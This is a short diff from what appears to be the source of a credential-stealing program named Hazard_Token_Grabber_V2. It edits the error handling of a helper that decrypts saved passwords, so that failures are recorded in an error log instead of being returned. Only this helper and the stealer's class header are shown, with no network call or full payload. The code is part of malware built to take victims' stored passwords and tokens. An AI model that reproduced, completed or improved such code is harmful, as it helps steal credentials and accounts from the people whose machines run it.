@@ -50,7 +50,7 @@ class functions(object):
             decrypted_pass = decrypted_pass[:-16].decode()
             return decrypted_pass
         except Exception:
-            return "Failed to decrypt password"
+            self.errors += "Failed to decrypt password"
 
 class Hazard_Token_Grabber_V2(functions):
     def __init__(self):
